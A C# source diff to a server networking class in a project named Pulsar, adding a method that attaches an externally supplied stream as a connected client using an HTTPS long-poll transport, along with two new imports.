@@ -1,4 +1,5 @@
-﻿using Pulsar.Common.Extensions;
+﻿using Pulsar.Common.DNS;
+using Pulsar.Common.Extensions;
 using Pulsar.Common.Messages;
 using Pulsar.Common.Messages.Other;
 using Pulsar.Common.Networking;
@@ -7,6 +8,7 @@ using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.Linq;
+using System.IO;
 using System.Net;
 using System.Net.Sockets;
 using System.Security.Cryptography.X509Certificates;
@@ -439,6 +441,26 @@ namespace Pulsar.Server.Networking
             {
                 Disconnect();
             }
+        }
+
+        /// <summary>
+        /// Attaches an externally provided stream as a connected client.
+        /// </summary>
+        /// <param name="stream">The communication stream.</param>
+        /// <param name="remoteEndPoint">The remote endpoint associated with the stream.</param>
+        /// <returns>The newly created client.</returns>
+        public Client AttachExternalStream(Stream stream, IPEndPoint remoteEndPoint)
+        {
+            if (stream == null) throw new ArgumentNullException(nameof(stream));
+
+            var client = new Client(stream, remoteEndPoint, ServerCertificate)
+            {
+                Transport = TransportKind.HttpsLongPoll,
+                TransportEndpoint = remoteEndPoint?.ToString() ?? string.Empty
+            };
+            AddClient(client);
+            OnClientState(client, true);
+            return client;
         }
 
         /// <summary>
